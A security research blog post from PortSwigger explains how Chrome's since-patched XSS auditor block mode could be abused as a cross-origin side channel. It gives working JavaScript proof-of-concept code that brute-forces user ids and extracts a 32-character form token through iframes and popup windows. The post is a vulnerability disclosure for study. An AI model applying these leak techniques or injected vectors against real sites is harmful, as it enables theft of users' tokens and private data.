# Abusing Chrome's XSS auditor to steal tokens

Source: https://portswigger.net/research/abusing-chromes-xss-auditor-to-steal-tokens
Fetched: 2026-06-28T09:17:19.812942+00:00

Abusing Chrome's XSS auditor to steal tokens

Gareth Heyes

Researcher

@garethheyes

Published: Monday, 17 August 2015 at 14:18 UTC

Updated: Friday, 14 June 2019 at 12:02 UTC

Detecting XSS auditor

James pointed out to me that XSS auditor in Chrome has a block mode and I thought it might be interesting to see if this could be exploited in some way. When the http header is set "X-XSS-Protection: 1; mode=block" XSS auditor removes all content on the page when a XSS attack is detected. I thought could use this to my advantage because if the target site contained an iframe then I could use the length property of the window to detect if the iframe was destroyed. In all modern browsers you can use contentWindow.length across domains. As the following code demonstrates.

<iframe onload="alert(this.contentWindow.length)" src="http://somedomain/with_iframe"></iframe>

So if the site has an iframe you will see an alert box with 1 and if not an alert of 0. If there is more than one iframe then it will alert the amount of iframes on the site. Basically this gives us a true or false condition to detect XSS auditor.

Getting a user id

My first thoughts on how to exploit this was to read a user id from in-line script. By injecting fake XSS vectors and monitoring the length property to see if the XSS auditor was active. Injecting a series of fake vectors incrementing the user id each time to detect the correct value. The output of the target page would look like this:

<?php

header("X-XSS-Protection: 1; mode=block");

?>

test

<iframe></iframe>

test

<script>

uid = 1337;

</script>

<div>x</div>

As you can see we put the XSS filter in block mode, the page contains an iframe and the script block contains a user id. Here's what the fake vectors look like:

?fakevector=<script>%0auid = 1;%0a

?fakevector=<script>%0auid = 2;%0a

?fakevector=<script>%0auid = 3;%0a

?fakevector=<script>%0auid = 4;%0a...

XSS auditor ignores the closing script but the ending new line is required in order to detect XSS. Here is a simple PoC to extract the uid:

<body>

<script>

!function(){

var url = 'http://somedomain/chrome_xss_filter_bruteforce/test.php?x=<script>%0auid = %s;%0a<\/script>',

amount = 9999, maxNumOfIframes = 1;

for(var i=0;i<maxNumOfIframes;i++) {

createIframe(i*amount,(i*amount)+amount,i);

}

function createIframe(min, max) {

var iframe = document.createElement('iframe'), div, p = document.createElement('p');

iframe.title = min;

iframe.onload = function() {

if(!this.contentWindow.length){

p.innerText = 'uid='+this.title;

document.body.removeChild(this);

return false;

}

if(this.title > max) {

document.body.removeChild(this);

} else {

this.contentWindow.location = url.replace(/%s/,++this.title)+'&'+(+new Date);

}

p.innerText = 'Bruteforcing...'+this.title;

}

iframe.src = url.replace(/%s/,iframe.title);

document.body.appendChild(iframe);

document.body.appendChild(p);

}

}();

</script>

</body>

The code creates one iframe (you could create multiple iframes but in this instance 1 iframe was faster), uses the onload handler and checks the contentWindow.length if it's found it returns the user id otherwise it tries the next value by setting the iframe location.

Using windows

If a website has x-frame-options or a CSP policy that prevents the site from being framed it's still possible to detect XSS auditor using new windows. Unfortunately we can't use the onload event handler for new windows as this isn't allowed cross domain for security reasons however we can get round this using timeouts/intervals to wait for the page to load.  The code looks like this:

<script>

function poc(id) {

if(!window.win) {

win = window.open('http://somedomain/chrome_xss_filter_bruteforce/test.php?x=<script>%0auid = '+id+';%0a<\/script>&'+(+new Date),'');

} else {

win.location = 'http://somedomain/chrome_xss_filter_bruteforce/test.php?x=<script>%0auid = '+id+';%0a<\/script>&'+(+new Date);

}

timer=setInterval(function(){

try {

win.document.documentElement;

} catch(e) {

if(win && !win.length) {

clearInterval(timer);

alert('uid='+id);

} else {

clearInterval(timer);

poc(++id);

}

}

},20);

}

</script>

<a href="#" onclick="poc(1)">PoC</a>

The first line checks if we already have a window, if not it creates a new window and stores a reference to it in a global variable. Then we use an interval with 20 milliseconds to repeatedly check if the XSS detection happened and if not it will call the function again.

Stealing tokens

So far the techniques presented are cool but a bit lame since they are quite restrictive in the data they can retrieve and require the script blocks to be formed in a certain way. Eduardo Vela suggested that I use form action and a existing parameter to pad the filter. I created a PoC that successfully extracts a 32 char hash from a form action!

The page requires an iframe, block mode and a filtered parameter that appears before the token you want to extract. It looks like this:

<?php

header("X-XSS-Protection: 1;mode=block");

session_start();

if(!isset($_SESSION['token'])) {

$token = md5(time());

$_SESSION['token'] = $token;

} else {

$token = $_SESSION['token'];

}

?>

<iframe></iframe>

<form action="testurl.php?x=<?php echo htmlentities($_GET['x'])?>&token=<?php echo $token?>"></form>

<?php echo $token?>

The "x" parameter is used to pad the XSS filter to be within the max match length minus 1 so that we can detect part of the token. As each part of the token is detected we reduce the padding accordingly and scan for the next character but there is a complication, zeros are ignored by XSS Auditor this means our string wouldn't be matched and we can't detect zeros because they are ignored. The way round this was to inject every character except zero and if the character isn't being detected once it's gone through the entire hex character set then the character must be zero. This works perfectly well except if there are two zeros adjacent, in this instance I check if there are more than two rounds of checks then there must be two zeros! I remove two characters of the detected token and push in two zeros.

Here is the PoC code:

<body>

<div id="x"></div>

<script>

function poc(){

var iframe = document.createElement('iframe'),

padding = '1234567891234567891234567891234567891234567891234567891234567891234567'.split(''),

token = "a".split(''),

tokenLen = 32, its = 0,

url = 'http://somedomain/chrome_xss_filter_bruteforce/form.php?x=%s&fakeparam=%3Cform%20action=%22testurl.php?x=%s2&token=%s3', last, repeated = 0;

iframe.src = url.replace(/%s/,padding.join('')).replace(/%s2/,padding.join('')).replace(/%s/,token.join(''));

iframe.width = 700;

iframe.height = 500;

iframe.onload = function() {

if(token.length === tokenLen+1) {

alert('The token is:'+token.slice(0,-1).join(''));

document.getElementById('x').innerText = document.getElementById('x').innerText.slice(0,-1);

return false;

}

if(this.contentWindow.length) {

getNextChar();

if(its > 20) {

token.pop();

token[token.length-1] = '0';

token.push("a");

its = 0;

repeated++;

}

if(repeated > 2) {

repeated = 0;

its = 0;

token.pop();

token.pop();

token[token.length-1] = '0';

token.push('0');

token.push('a');

}

this.contentWindow.location = url.replace(/%s/,padding.join('')).replace(/%s2/,padding.join('')).replace(/%s/,token.join(''));

its++;

} else {

repeated = 0;

its = 0;

token.push("a");

padding.pop();

this.contentWindow.location = url.replace(/%s/,padding.join('')).replace(/%s2/,padding.join('')).replace(/%s/,token.join(''));

}

document.getElementById('x').innerText = 'Token:'+token.join('');

}

document.body.appendChild(iframe);

function getNextChar() {

chr = token[token.length-1];

if(chr === 'f' && last === 'f') {

token[token.length-1] = '1';

last = '1';

return false;

} else if(chr === '9' && last === '9') {

token[token.length-1] = 'a';

last = 'a';

return false;

}

if(chr >= 'a' && chr < 'f') {

token[token.length-1] = String.fromCharCode(chr.charCodeAt()+1);

} else if(chr === 'f') {

token[token.length-1] = 'f';

} else if(chr >= '0' && chr < '9') {

token[token.length-1] = String.fromCharCode(chr.charCodeAt()+1);

} else if(chr === '9') {

token[token.length-1] = '9';

}

last = chr;

}

}

poc();

</script>

</body>

First the padding is injected into the real parameter, then also into our fake parameter along with the form action url. The token can now be checked one character at a time. "its" contains the current iterations if it's above 20 then no character is being detected so it means it must be a zero. If this process is repeated more than twice we have two zeros.

The final PoC is available here. It has been patched in the latest version of Chrome and the PoC no longer works. However here is a video demonstrating the flaw:

https://www.youtube.com/embed/xdXFwpxReI0?feature=player_embedded

Visit our Web Security Academy to learn more about cross-site scripting (XSS)

Back to all articles

Related Research

05 February 2026

06 January 2026

The Fragile Lock:

Novel Bypasses For SAML Authentication

10 December 2025

The Fragile Lock:

Novel Bypasses For SAML Authentication

Introducing HTTP Anomaly Rank

11 November 2025

Introducing HTTP Anomaly Rank
